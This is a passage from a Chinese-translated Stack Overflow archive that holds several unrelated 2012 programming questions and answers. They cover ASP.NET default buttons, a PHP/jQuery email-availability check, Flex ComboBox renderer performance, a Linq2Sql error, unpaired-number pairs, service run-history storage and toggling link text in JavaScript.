                <asp:ListItem Text="X" Value="X"  />
                <asp:ListItem Text="Y" Value="Y"  />
                <asp:ListItem Text="Z" Value="Z"  />
                <asp:ListItem Text="0" Value="0"  />
                <asp:ListItem Text="1" Value="1"  />
                <asp:ListItem Text="2" Value="2"  />
                <asp:ListItem Text="3" Value="3"  />
                <asp:ListItem Text="4" Value="4"  />
                <asp:ListItem Text="5" Value="5"  />
                <asp:ListItem Text="6" Value="6"  />
                <asp:ListItem Text="7" Value="7"  />
                <asp:ListItem Text="8" Value="8"  />
                <asp:ListItem Text="9" Value="9"  />
            </asp:DropDownList>
            </ItemTemplate>
            <EmptyItemTemplate>           

            </EmptyItemTemplate>
        </asp:ListView>

        </td>
    </tr>
    <tr>
        <td>
        <asp:Panel runat="server" ID="pnlEnter" DefaultButton="btnQuery" >
        <asp:Button ID="btnQuery" runat="server" Text="Submit" />
        </asp:Panel>
        </td>
        <td align="right">
        <asp:Button ID="btnAddRow" runat="server" Text="Add Row" />
        </td>
    </tr>
</table> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:26:04.187

在表单标签而不是面板中设置`DefaultButton`属性，`UseSubmitBehavior="true"`并在您的 asp:button 中设置属性。

希望它能解决您的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:34:04.743

另一种方法是编写一个 JavaScript 片段来检测“Enter”按钮，然后提交表单：

```
 function yourKeyPressFunction(e) {
        if (e.keyCode == 13) {
            this.form.submit();
        }
    }

    <form method="post" onkeypress="yourKeyPressFunction(event)"> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T17:31:47.287

您需要在列表视图上方创建面板；

```
<asp:Panel runat="server" ID="pnlEnter" DefaultButton="btnQuery">   // panel should be at top of listview
       <asp:ListView ID="lvQuery" runat="server" >
          .......
          ........
       </aspListView>
       <asp:Button ID="btnQuery" runat="server" Text="Submit" />         
</asp:Panel> 
```

# php - 使用 PHP 和 AJAX 进行服务器端验证时遇到问题

> ID：12146547
> 
> 赞同：0
> 
> 时间：2012-08-27T17:23:00.830
> 
> 标签：php, jquery, ajax

我只想在输入电子邮件后自动显示是否可以使用电子邮件（数据库中不存在）或不（数据库中存在）。当我输入时没有显示输出。截至目前我有这个代码。我应该如何解决这个问题

这是我的主页代码

```
<!DOCTYPE HTML>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Jquery-ajax Practice</title>
</head>

<body>
<section>
    <form>
        <label for="text_email">E-mail:</label>
        <input id="text_email" type="email" >

        <script type="text/javascript" charset="utf-8" src="//ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js">
            $(document).ready(function(){
                $('#text_email').keyup(function(){
                    email($(this).val());
                });
            });
            function email(str){
                $.post('checkmail.php',{ email: str},
                function(data){
                    $('#check_email').html(data.returnValue);
                }, 'json');
            }
        </script>

        <label for="text_email" id="check_email"></label>   
    </form>
</section>
</body>
</html> 
```

这是我的php代码

```
<?php
if(isset($_POST['email']))
{
    try 
    {
        $pdo=new PDO('mysql:host=localhost;dbname=class;charset=utf-8', 'root');
    }
    catch(PDOException $e)
    {
        echo 'Failed: '.$e->getMessage();
    }

    $stmt=$pdo->prepare('SELECT email FROM class where email=:email LIMIT 1');
    $stmt->execute(array(':email'=>$_POST['email']));
    if($stmt->rowCount()>0)
    {
        $check='E-mail cannot be use.';
    }
    else
    {
        $check='E-mail can be use.';
    }

    echo json_encode(array('returnValue'=>$check));
}
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T17:51:28.273

我可以看到的一个问题是您对数据库错误的处理。

您应该将所有 PDO 操作包装在一个`try`-`catch`块中（不仅仅是连接部分），当您发现错误时，您还需要将其包装在`json_encode`最后的语句中，而不仅仅是回显它，因为这会使接收到​​的无效客户端的json。

我不知道你的数据库设置，但你没有提供密码，我认为你的连接字符串应该有`charset=utf8`.

# sql-server-2008 - SQL Server Profiler 和黄色背景单元格

> ID：12146548
> 
> 赞同：2
> 
> 时间：2012-08-27T17:23:07.940
> 
> 标签：sql-server-2008, sql-server-profiler

在 SQL Profiler 中查看返回的数据时，一些单元格显示为黄色背景，而其他单元格显示为白色背景。空的 BinaryData 字段似乎都以这种方式出现，但一些包含诸如“exec sp_reset_connection”之类的命令的 TextData 字段也显示出这种行为。

有谁知道黄色是什么意思，是否可以通过跟踪过滤器访问导致背景变黄的相同标准？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T21:22:03.000

黄色背景意味着`TextData`似乎意味着单元格中的文本是从另一列中的值派生的——很可能`BinaryData`。

在[某些情况下](https://stackoverflow.com/questions/11845012/decimal-passed-incorrectly-from-c-sharp-to-sql-server-with-tableadapters/11845924#11845924)，以这种方式导出的值`TextData`可能不正确。

# actionscript-3 - 使用项目渲染器时打开组合框的延迟

> ID：12146551
> 
> 赞同：2
> 
> 时间：2012-08-27T17:23:26.827
> 
> 标签：actionscript-3, apache-flex, flex3

我试图找出一种方法来提高其中包含项目渲染的组合框的性能。当我使用没有自定义项目渲染器的组合框时，下拉菜单会快速打开，并且组合框的响应速度非常快。当我添加一个简单的项目渲染器时，现在需要一秒钟才能打开组合框。这就像它创建所有孩子然后缓存它们。之后，组合框打开正常，直到您选择一个项目。然后打开组合框也需要一段时间。

这是一个演示该问题的示例应用程序：

```
<?xml version="1.0"?>
<mx:Application xmlns:mx="http://www.adobe.com/2006/mxml"
            height="100%" width="100%" xmlns:local="*"
    >
<mx:Script><![CDATA[
    import mx.collections.ArrayCollection;

    public var dataProvider:ArrayCollection = new ArrayCollection(
               [{label:"test1"}, 
                {label:"test2"}, 
                {label:"test3"}]);

    ]]></mx:Script>

<!-- combobox with item renderer, this has a delay when opening -->

<mx:ComboBox width="200"
             dataProvider="{dataProvider}">
    <mx:itemRenderer>
        <mx:Component>
            <mx:HBox xmlns:mx="http://www.adobe.com/2006/mxml">
                <mx:Label text="'item renderer' + {data.label}"/>
            </mx:HBox>
        </mx:Component>
    </mx:itemRenderer>
</mx:ComboBox>

<!-- default combobox, this works fine -->

<mx:ComboBox width="200"
             dataProvider="{dataProvider}"/>
</mx:Application> 
```

我在这里想念什么？这似乎不应该发生。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-05T22:07:55.990

在花了一些时间试图找到解决方案后，我发现如果在 中只定义一个“干净”的子组件`<mx:Component>`，性能会好得多。

因此，以下提供了良好的性能：

```
<mx:Component>
    <mx:HBox /> ( "clean" )
</mx:Component> 
```

而这个表现不佳（延迟）：

```
<mx:Component>
    <mx:HBox>
        <mx:Label /> ( not "clean" )
    </mx:HBox>
</mx:Component> 
```

为了解决这个问题，我们可以使用代码创建子组件：

```
<mx:itemRenderer>
    <mx:Component>
        <mx:HBox xmlns:mx="http://www.adobe.com/2006/mxml">
            <mx:Script>
                <![CDATA[
                    import mx.controls.Label;

                    // Define the label instance
                    private var lbl:Label = new Label();

                    // Add the label as a child component
                    override protected function createChildren(): void {
                        super.createChildren();
                        addChild( lbl );
                    }

                    // Set the data
                    override public function set data( value:Object ): void {
                        super.data = value;
                        if ( value ) {
                            lbl.text = value.label;
                        }
                    }
                ]]>
            </mx:Script>
        </mx:HBox>
    </mx:Component>
</mx:itemRenderer> 
```

演示：[https ://github.com/jeantimex/flex-combobox-itemrenderer](https://github.com/jeantimex/flex-combobox-itemrenderer)

希望有帮助！

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-27T18:58:27.760

这可能是朝着正确方向迈出的一步；但我不能保证有解决方案。我建议您首先重写您的 itemRenderer 以不使用绑定。通过教他们，我已经为付费客户解决了很多内存泄漏问题。在 itemRenderers 中，Binding 也是一项性能繁重的操作；所以我建议将其从操作中删除。

我更喜欢响应 dataChange 方法，而不是在 itemRenderer 中使用 Binding。

我还建议您从 itemRenderer 中删除 HBox；因为您应该能够按原样使用标签：

```
<mx:ComboBox width="200"
             dataProvider="{dataProvider}">
    <mx:itemRenderer>
        <mx:Component>
            <mx:Label dataChange="onDataChange(event)">
              <mx:Script>
                 protected function onDataChange(event:Event):void{
                    this.text='item renderer' + data.label;
                 }
              </mx:Script>
            </mx:Label>
        </mx:Component>
    </mx:itemRenderer>
</mx:ComboBox> 
```

我不确定这是否会解决任何性能问题。在创建 Flextras AutoComplete 时，我必须解决与 Flex ComboBox 相关的许多奇怪问题。

记忆告诉我，在 Flex 3.4（及之前）中，每次关闭下拉菜单时；它被破坏了——基本上没有缓存在内存中。这在 Flex 3.5 中发生了变化，而他们开始缓存它并重新使用相同的下拉对象。我想知道您感知的性能问题是否与此有关。

* * *

编辑1：基于对这篇文章没有解决根本问题的投诉；我根据原始海报代码和我建议的更改组合了[这个测试用例。](http://www.flextras.com/labs/forclients/fordevshorts/ComboBox_SO.html)我建议的更改确实解决了原始海报所遇到的问题。以下是示例背后的来源：

```
 [Bindable]
    public var dataProvider:ArrayCollection = new ArrayCollection(
        [{label:"test1"}, 
            {label:"test2"}, 
            {label:"test3"}]);

]]></mx:Script>

<!-- combobox with item renderer, this has a delay when opening -->

<mx:VBox>

<!-- ComboBox provided by original poster -->
<mx:ComboBox width="200"
             dataProvider="{dataProvider}">
    <mx:itemRenderer>
        <mx:Component>
            <mx:HBox xmlns:mx="http://www.adobe.com/2006/mxml">
                <mx:Label text="'item renderer' + {data.label}"/>
            </mx:HBox>
        </mx:Component>
    </mx:itemRenderer>
</mx:ComboBox>

<!-- ComboBox with rewritten itemRenderer; which does not exhibit the problem -->
<mx:ComboBox width="200"
             dataProvider="{dataProvider}">
    <mx:itemRenderer>
        <mx:Component>
            <mx:Label dataChange="label1_dataChangeHandler(event)">
                <mx:Script>
                    <![CDATA[
                        import mx.events.FlexEvent;

                        protected function label1_dataChangeHandler(event:FlexEvent):void
                        {
                            this.text = "item renderer" + data.label;
                        }

                    ]]>
                </mx:Script>
            </mx:Label>
        </mx:Component>
    </mx:itemRenderer>
</mx:ComboBox>

<!-- default combobox, this works fine -->

<mx:ComboBox width="200"
             dataProvider="{dataProvider}"/>
</mx:VBox> 
```

* * *

编辑 2：devshorts 说如果我们将组件创建为独立的 itemRenderer，我的代码将不起作用；但是我不明白为什么不。

这是独立 itemRenderer 的代码，名为 com.flextras.listRenderers.CustomLabelRenderer：

```
<?xml version="1.0" encoding="utf-8"?>
<mx:Label xmlns:mx="http://www.adobe.com/2006/mxml" dataChange="label1_dataChangeHandler(event)">

    <mx:Script>
        <![CDATA[
            import mx.events.FlexEvent;

            protected function label1_dataChangeHandler(event:FlexEvent):void
            {
                this.text = "item renderer" + data.label;
            }

        ]]>
    </mx:Script>    
</mx:Label> 
```

这里有一些代码可以添加到上面的邮件应用程序中来测试它：

```
<!-- ComboBox, like above with the itemRenderer as a separate component -->
    <mx:ComboBox width="200"
             dataProvider="{dataProvider}" itemRenderer="com.flextras.listRenderers.CustomLabelRenderer" /> 
```

[我在我提供的链接](http://www.flextras.com/labs/forclients/fordevshorts/ComboBox_SO.html)上更新了应用程序以包含这个新的 ComboBox 实例；它现在是名单上的第 3 位。

# c# - Linq2Sql context.SubmitChanges() 生成“对象引用未设置为对象的实例”。错误

> ID：12146552
> 
> 赞同：0
> 
> 时间：2012-08-27T17:23:27.840
> 
> 标签：c#, wcf, linq-to-sql

我有一个使用 Linq2Sql 将记录插入数据库的 Web 服务。

Web服务方法如下：

```
public class WS_StreamCrossing : IStreamCrossing
{
    public string SendStreamCrossingSurveys(List<Survey> mySurveyList)
    {
        if (mySurveyList == null)
        {
            throw new ArgumentNullException("mySurveyList");
        }

        string result = "Failed";

        using (StreamCrossingDataContext myObjectContext = GetDBContext())
        {
            foreach (Survey myPassedSurvey in mySurveyList)
            {
                // Check for existing Survey with matching data (PRNo, MP, FWVersion, CulvertID, SurveyDate)
                Survey myMatchingSurvey = myObjectContext.Surveys.FirstOrDefault(x => x.PRNo == myPassedSurvey.PRNo && x.MP == myPassedSurvey.MP && x.FWVersion == myPassedSurvey.FWVersion && x.CulvertID == myPassedSurvey.CulvertID && x.SurveyDate == myPassedSurvey.SurveyDate);
                if (myMatchingSurvey != null)
                {

                    myMatchingSurvey.AdjacentLandowner = myPassedSurvey.AdjacentLandowner;
                    myMatchingSurvey.ApproachLengthLeft = myPassedSurvey.ApproachLengthLeft;
                    myMatchingSurvey.ApproachLengthRight = myPassedSurvey.ApproachLengthRight;
                    myMatchingSurvey.ApproachSlopeLeft = myPassedSurvey.ApproachSlopeLeft;
                    myMatchingSurvey.ApproachSlopeRight = myPassedSurvey.ApproachSlopeRight;
                    myMatchingSurvey.BackwaterComments = myPassedSurvey.BackwaterComments;
                    myMatchingSurvey.CalculatedPassability = myPassedSurvey.CalculatedPassability;
                    myMatchingSurvey.County = myPassedSurvey.County;
                    myMatchingSurvey.CrossingType = myPassedSurvey.CrossingType;
                    myMatchingSurvey.CrushedLocation = myPassedSurvey.CrushedLocation;
                    myMatchingSurvey.CrushedPercent = myPassedSurvey.CrushedPercent;
                    //myMatchingSurvey.CulvertID = myPassedSurvey.CulvertID;
                    myMatchingSurvey.DefinedPassability = myPassedSurvey.DefinedPassability;
                    myMatchingSurvey.ErosionExtent = myPassedSurvey.ErosionExtent;
                    myMatchingSurvey.ErosionNotes = myPassedSurvey.ErosionNotes;
                    myMatchingSurvey.FillDepthDownStream = myPassedSurvey.FillDepthDownStream;
                    myMatchingSurvey.FillDepthUpStream = myPassedSurvey.FillDepthUpStream;
                    myMatchingSurvey.FutureComments = myPassedSurvey.FutureComments;
                    myMatchingSurvey.FutureVisit = myPassedSurvey.FutureVisit;
                    //myMatchingSurvey.FWVersion = myPassedSurvey.FWVersion;
                    myMatchingSurvey.GeneralCondition = myPassedSurvey.GeneralCondition;
                    myMatchingSurvey.HeadChangeComments = myPassedSurvey.HeadChangeComments;
                    myMatchingSurvey.InletStructure = myPassedSurvey.InletStructure;
                    myMatchingSurvey.IsBackwatered = myPassedSurvey.IsBackwatered;
                    myMatchingSurvey.IsErosionCorrectable = myPassedSurvey.IsErosionCorrectable;
                    myMatchingSurvey.IsErosionPresent = myPassedSurvey.IsErosionPresent;
                    myMatchingSurvey.IsHeadChanged = myPassedSurvey.IsHeadChanged;
                    myMatchingSurvey.IsOvertopping = myPassedSurvey.IsOvertopping;
                    myMatchingSurvey.IsPerched = myPassedSurvey.IsPerched;
                    myMatchingSurvey.IsPrioritySite = myPassedSurvey.IsPrioritySite;
                    myMatchingSurvey.IsRustedThrough = myPassedSurvey.IsRustedThrough;
                    myMatchingSurvey.IsScourPoolPresent = myPassedSurvey.IsScourPoolPresent;
                    myMatchingSurvey.IsSubstrateEntireLength = myPassedSurvey.IsSubstrateEntireLength;
                    myMatchingSurvey.IsUpstreamPondPresent = myPassedSurvey.IsUpstreamPondPresent;
                    myMatchingSurvey.Latitude = myPassedSurvey.Latitude;
                    myMatchingSurvey.LocationComments = myPassedSurvey.LocationComments;
                    myMatchingSurvey.LocationOfLowPoint = myPassedSurvey.LocationOfLowPoint;
                    myMatchingSurvey.Longitude = myPassedSurvey.Longitude;
                    //myMatchingSurvey.MP = myPassedSurvey.MP;
                    myMatchingSurvey.NonNativeInvasiveSpecies = myPassedSurvey.NonNativeInvasiveSpecies;
                    myMatchingSurvey.Observers = myPassedSurvey.Observers;
                    myMatchingSurvey.OutletStructure = myPassedSurvey.OutletStructure;
                    myMatchingSurvey.OutletType = myPassedSurvey.OutletType;
                    myMatchingSurvey.OvertoppingComments = myPassedSurvey.OvertoppingComments;
                    myMatchingSurvey.PassabilityComments = myPassedSurvey.PassabilityComments;
                    myMatchingSurvey.PerchHeight = myPassedSurvey.PerchHeight;
                    myMatchingSurvey.PhotoDownstream = myPassedSurvey.PhotoDownstream;
                    myMatchingSurvey.PhotoInlet = myPassedSurvey.PhotoInlet;
                    myMatchingSurvey.PhotoOutlet = myPassedSurvey.PhotoOutlet;
                    myMatchingSurvey.PhotoRoadApproachLeft = myPassedSurvey.PhotoRoadApproachLeft;
                    myMatchingSurvey.PhotoRoadApproachRight = myPassedSurvey.PhotoRoadApproachRight;
                    myMatchingSurvey.PhotoUpstream = myPassedSurvey.PhotoUpstream;
                    myMatchingSurvey.PluggedLocation = myPassedSurvey.PluggedLocation;
                    myMatchingSurvey.PluggedPercent = myPassedSurvey.PluggedPercent;
                    myMatchingSurvey.PriorityComments = myPassedSurvey.PriorityComments;
                    myMatchingSurvey.PriorityReason = myPassedSurvey.PriorityReason;
                    //myMatchingSurvey.PRNo = myPassedSurvey.PRNo;
                    myMatchingSurvey.PtID = myPassedSurvey.PtID;
                    myMatchingSurvey.RefMiles = myPassedSurvey.RefMiles;
                    myMatchingSurvey.RiffleBankfullWidth = myPassedSurvey.RiffleBankfullWidth;
                    myMatchingSurvey.RiffleMeasuredWith = myPassedSurvey.RiffleMeasuredWith;
                    myMatchingSurvey.RiffleSubstrate = myPassedSurvey.RiffleSubstrate;
                    myMatchingSurvey.RiffleWaterDepth = myPassedSurvey.RiffleWaterDepth;
                    myMatchingSurvey.RiffleWaterVelocity = myPassedSurvey.RiffleWaterVelocity;
                    myMatchingSurvey.RiffleWettedWidth = myPassedSurvey.RiffleWettedWidth;
                    myMatchingSurvey.RoadCondition = myPassedSurvey.RoadCondition;
                    myMatchingSurvey.RoadName = myPassedSurvey.RoadName;
                    myMatchingSurvey.RoadSurface = myPassedSurvey.RoadSurface;
                    myMatchingSurvey.RoadWidth = myPassedSurvey.RoadWidth;
                    myMatchingSurvey.RunOffPath = myPassedSurvey.RunOffPath;
                    myMatchingSurvey.ScourPoolDepth = myPassedSurvey.ScourPoolDepth;
                    myMatchingSurvey.ScourPoolLength = myPassedSurvey.ScourPoolLength;
                    myMatchingSurvey.ScourPoolWidth = myPassedSurvey.ScourPoolWidth;
                    myMatchingSurvey.SiteID = myPassedSurvey.SiteID;
                    myMatchingSurvey.SlopeDownStream = myPassedSurvey.SlopeDownStream;
                    myMatchingSurvey.SlopeUpStream = myPassedSurvey.SlopeUpStream;
                    myMatchingSurvey.SpeciesObserved = myPassedSurvey.SpeciesObserved;
                    myMatchingSurvey.StreamFlow = myPassedSurvey.StreamFlow;
                    myMatchingSurvey.StructureEmbeddedDepthInlet = myPassedSurvey.StructureEmbeddedDepthInlet;
                    myMatchingSurvey.StructureEmbeddedDepthOutlet = myPassedSurvey.StructureEmbeddedDepthOutlet;
                    myMatchingSurvey.StructureInterior = myPassedSurvey.StructureInterior;
                    myMatchingSurvey.StructureShape = myPassedSurvey.StructureShape;
                    myMatchingSurvey.StructureWaterDepthInlet = myPassedSurvey.StructureWaterDepthInlet;
                    myMatchingSurvey.StructureWaterDepthOutlet = myPassedSurvey.StructureWaterDepthOutlet;
                    myMatchingSurvey.StructureWaterVelocityInlet = myPassedSurvey.StructureWaterVelocityInlet;
                    myMatchingSurvey.StructureWaterVelocityMeasured = myPassedSurvey.StructureWaterVelocityMeasured;
                    myMatchingSurvey.StructureWaterVelocityMeasuredWith = myPassedSurvey.StructureWaterVelocityMeasuredWith;
                    myMatchingSurvey.StructureWaterVelocityOutlet = myPassedSurvey.StructureWaterVelocityOutlet;
                    myMatchingSurvey.SubstrateInStructure = myPassedSurvey.SubstrateInStructure;
                    //myMatchingSurvey.SurveyDate = myPassedSurvey.SurveyDate;
                    myMatchingSurvey.UpstreamPondLength = myPassedSurvey.UpstreamPondLength;
                    myMatchingSurvey.UpstreamPondWidth = myPassedSurvey.UpstreamPondWidth;
                    myMatchingSurvey.VegetationDitchLeft = myPassedSurvey.VegetationDitchLeft;
                    myMatchingSurvey.VegetationDitchRight = myPassedSurvey.VegetationDitchRight;
                    myMatchingSurvey.Waterway = myPassedSurvey.Waterway;

                    // Delete all Erosions
                    myObjectContext.Erosions.DeleteAllOnSubmit(myMatchingSurvey.Erosions);

                    // Assign new Erosions
                    myMatchingSurvey.Erosions = myPassedSurvey.Erosions;

                    // Delete all Spans
                    myObjectContext.Spans.DeleteAllOnSubmit(myMatchingSurvey.Spans);

                    // Assign new Spans
                    myMatchingSurvey.Spans = myPassedSurvey.Spans;

                }
                else
                {
                    myObjectContext.Surveys.InsertOnSubmit(myPassedSurvey);
                }
            }

            myObjectContext.SubmitChanges();
            result = "Success";

        }

        return result;
    } 
```

当我通过 Web 服务发送基本测试以添加新记录时，它会在以下位置生成错误`myObjectContext.SubmitChanges()`：

> System.NullReferenceException 未被用户代码处理 Message=Object 引用未设置为对象的实例。Source=System.Data.Linq StackTrace：在 System.Data.Linq.Binary.ToArray() 在 System.Data.Linq.DBConvert.ChangeType(Object value, Type type) 在 System.Data.Linq.SqlClient.SqlTypeSystem.ProviderBase System.Data.Linq.SqlClient.SqlProvider.AssignParameters 处 System.Data.Linq.SqlClient.SqlTypeSystem.ProviderBase.InitializeParameter(ProviderType 类型，DbParameter 参数，对象值) 处的 .GetParameterValue(SqlType 类型，对象值)(DbCommand cmd，ReadOnlyCollection`1 parms, Object[] userArguments, Object lastResult) at System.Data.Linq.SqlClient.SqlProvider.Execute(Expression query, QueryInfo queryInfo, IObjectReaderFactory factory, Object[] parentArgs, Object[] userArgs, ICompiledSubQuery[] subQueries, Object lastResult) at System.Data.Linq.SqlClient.SqlProvider.ExecuteAll(Expression query, QueryInfo[] queryInfos, IObjectReaderFactory factory, Object[] userArguments, ICompiledSubQuery[] subQueries) at System.Data.Linq.SqlClient.SqlProvider.System.Data.Linq.Provider.IProvider.Execute(Expression query) at System.Data.Linq.ChangeDirector.StandardChangeDirector.DynamicInsert(TrackedObject item) at System.Data.Linq.ChangeDirector.StandardChangeDirector.Insert(TrackedObject item) at System.Data.Linq.ChangeProcessor.SubmitChanges(ConflictMode failureMode) at System.Data.Linq.DataContext.SubmitChanges(ConflictMode failureMode) at System.Data.Linq.DataContext.SubmitChanges() at DNR.CulvertInventory.SERVICE.WS_StreamCrossing.SendStreamCrossingSurveys(List`C:\TFS Projects\DNR.CulvertInventory\Main\Src\Code\DNR.CulvertInventory\DNR.CulvertInventory.SERVICE\WS_StreamCrossing.svc.cs 中的 1 mySurveyList）：DNR.CulvertInventory.SERVICE.WS_StreamCrossing.SendStreamCrossingSurvey（Survey）的第 255 行mySurvey) 在 C:\TFS Projects\DNR.CulvertInventory\Main\Src\Code\DNR.CulvertInventory\DNR.CulvertInventory.SERVICE\WS_StreamCrossing.svc.cs: SyncInvokeSendStreamCrossingSurvey (Object , Object[] , Object[] ) 的第 273 行在 System.ServiceModel.Dispatcher.DispatchOperationRuntime.InvokeBegin(MessageRpc& rpc) InnerException：

问题是，当我使用 Visual Studio 测试项目对服务运行测试时，不会发生此错误。这是一个示例测试，它正在尝试同样的事情并且工作得很好：

```
[TestMethod]
[HostType("ASP.NET")]
[AspNetDevelopmentServerHost(testDirectory)]
[UrlToTest(testURL)]
public void CanCreateNewSurveyWithErosionsAndSpans()
{
    string expected = "Success";

    SERVICE.Survey mySurvey = CreateBaseSurveyObject();

    SERVICE.Erosion myFirstErosion = CreateErosionObject(2);
    mySurvey.Erosions.Add(myFirstErosion);

    SERVICE.Erosion mySecondErosion = CreateErosionObject(2);
    mySurvey.Erosions.Add(mySecondErosion);

    SERVICE.Span myFirstSpan = CreateSpanObject(2);
    mySurvey.Spans.Add(myFirstSpan);

    SERVICE.Span mySecondSpan = CreateSpanObject(2);
    mySurvey.Spans.Add(mySecondSpan);

    string actual = target.SendStreamCrossingSurvey(mySurvey);

    Assert.AreEqual(expected, actual);
} 
```

有任何想法吗？

为了回答问题，这里有更多数据。

这是`GetDBContext()`方法：

```
private StreamCrossingDataContext GetDBContext()
{
    SERVICE.StreamCrossingDataContext db = new SERVICE.StreamCrossingDataContext();

    DataLoadOptions options = new DataLoadOptions();

    options.LoadWith<SERVICE.Survey>(x => x.Erosions);
    options.LoadWith<SERVICE.Survey>(x => x.Spans);

    db.LoadOptions = options;

    return db;
} 
```

# c# - 从给定的数字对中找到不成对的数字

> ID：12146554
> 
> 赞同：0
> 
> 时间：2012-08-27T17:23:48.537
> 
> 标签：c#, algorithm, math

是否有任何算法可以从给定的成对数列表中找到未成对数。例如在 {(1,2),(2,3),(3,4)} 对 (1,3) 和 (2,4 ) 从未配对。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-27T17:26:30.377

你可以这样做：

1.  遍历所有对并建立一组出现在集合中的所有数字。
2.  构造所有可能的数字对，将结果存储在不同的集合中。
3.  遍历原始列表中的所有对，并从所有对的集合中删除您找到的每一对。
4.  您现在剩下所有未出现在原始集合中的对。

当然，这假设您只关心原始集合中的值对。例如，对 (1, 5) 也不在您的示例中。（猫，狗）也不是。

这在时间 O(n ² ) 中运行，其中 n 是原始对集中表示的数字的数量。

希望这可以帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T18:03:56.147

使用 LINQ 和对称技巧，利用 (1,3) 和 (3,1) 相同的事实，因此忽略第二个数字大于第一个数字的情况：

```
public static IEnumerable<Tuple<int, int>> GetUnpairedNumbers(IEnumerable<Tuple<int, int>> existingPairs ) {
    var uniqueNumbers = existingPairs.SelectMany(p => new[] {p.Item1, p.Item2}).Distinct().ToList();
    var isUsed = uniqueNumbers.ToDictionary(n => n, n => uniqueNumbers.Where(inner => n < inner).ToDictionary(inner => inner, inner => false));

    foreach(var currentPair in existingPairs) {
        isUsed[currentPair.Item1][currentPair.Item2] = true;
    }

    return isUsed.Keys.SelectMany(n => isUsed[n].Where(kvp => !kvp.Value).Select(kvp => Tuple.Create(n, kvp.Key)));
}
public static void Main(string[] args) {
    var unpairedNumbers = GetUnpairedNumbers(new[] { P(1, 2), P(2, 3), P(3, 4) });
}

private static Tuple<int, int> P(int a, int b) {
    return Tuple.Create(a, b);
} 
```

# c# - 存储需要在 WPF 应用程序中加载的 Windows 服务运行历史记录

> ID：12146556
> 
> 赞同：0
> 
> 时间：2012-08-27T17:24:03.863
> 
> 标签：c#, wpf, logging, .net-4.0, windows-services

我有一个 C# .NET 4 Windows 服务，它需要存储其运行历史记录（日期/时间、统计信息和成功/失败的记录）。通常每天会有 1 个条目，所以随着时间的推移，运行历史会增长到几百或几千，但我预计不会增长到几万。每个条目将有 10-15 个字段。

此运行历史记录需要由与 Windows 服务在同一台计算机上运行的 WPF 应用程序读取和显示。这台机器安装了带有 .NET Framework 4 的全新操作系统，没有安装其他任何东西。

存储运行历史的最佳位置和最佳格式在哪里，以便可以快速轻松地将其加载到 WPF 应用程序中？

我正在考虑一个 XML 文件，可能绑定到一个网格（我不是真正的 WPF 专家）。对于这种大小的记录，1 个 XML 文件是否可以，并且在 WPF 中加载是否容易？你有什么更好的建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T17:44:12.603

XML 可以工作，但我个人在这种情况下会选择 SQLCE。易于使用、免费且易于升级到 SQL Server Express 或 Standard，在您可能需要的情况下。

[http://www.microsoft.com/en-us/download/details.aspx?id=17876](http://www.microsoft.com/en-us/download/details.aspx?id=17876)

# javascript - Javascript更改文本onClick然后再次更改

> ID：12146557
> 
> 赞同：3
> 
> 时间：2012-08-27T17:24:08.183
> 
> 标签：javascript, text, onclick, hyperlink

我试图在单击时更改链接的文本，然后在再次单击时再次更改回原始文本。我能够更改文本（从 READ MORE... 到 CLOSE），但一直在努力再次将文本改回（从 CLOSE 到 READ MORE...）

```
 <script language="javascript">
 function changeText(idElement){
 if(idElement==1){
 document.getElementById('element'+idElement).innerHTML ='Close';
 } else if(idElement==2){
 document.getElementById('element'+idElement).innerHTML ='Close';
 }
 }
 </script>

 <a id="element1" onClick="javascript:changeText(1)">Read More...</a>
 <a id="element2" onClick="javascript:changeText(2)">Read More...</a> 
```

感谢您提前提供任何帮助。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-27T17:31:42.603

This should work:

```
function changeText(idElement) {
    var element = document.getElementById('element' + idElement);
    if (idElement === 1 || idElement === 2) {
        if (element.innerHTML === 'Read More...') element.innerHTML = 'Close';
        else {
            element.innerHTML = 'Read More...';
        }
    }
} 
```

***Demo:*** [http://jsfiddle.net/UfVAH/](http://jsfiddle.net/UfVAH/)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-09-06T08:05:20.120

```
<a href="javascript:void(0)" onclick="if(this.innerHTML =='Read More'){this.innerHTML = 'Close'}else{this.innerHTML = 'Read More'}">Read More</a> 
```

只需`javascript:void(0);`使用打开/关闭功能更改并确保返回 false。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-09-06T08:00:59.943

```
<script language="javascript">
function changeText(idElement){
    if(idElement==1){
        document.getElementById('element'+idElement).innerHTML ='<a href="http://www.google.com">Google</a>';
    } else if(idElement==2){
        document.getElementById('element'+idElement).innerHTML ='<a href="http://woork.blogspot.com">Woork</a>';
    }
}
</script>

<ul>
<li id="element1">Google</li>
<li id="element2">Woork</li>
</ul>
<a href="#" onClick="javascript:changeText(1)">Change Google into a link</a><br/>
<a href="#" onClick="javascript:changeText(2)">Change Woork into a link</a><br/> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-27T17:32:01.030

那是因为您的函数仅在元素获得点击时将值设置为“关闭”。您需要在设置之前检查该值是什么。所以你应该修改你的功能是这样的：

```
 function changeText(idElement){
        if(idElement==1){
            if( document.getElementById('element'+idElement).innerHTML == 'Read More' ){
                document.getElementById('element'+idElement).innerHTML = 'Close';
            } 
            else if( document.getElementById('element'+idElement).innerHTML == 'Close' ) {
                document.getElementById('element'+idElement).innerHTML = 'Read More';
            }
        } 
        else if(idElement==2){
            if( document.getElementById('element'+idElement).innerHTML == 'Read More' ) {
                document.getElementById('element'+idElement).innerHTML = 'Close';
            }
            else if( document.getElementById('element'+idElement).innerHTML == 'Close' ) {
                document.getElementById('element'+idElement).innerHTML = 'Read More';
            }
        }
    } 
```

}

* * *

## 回答 #5

> 赞同：0
> 
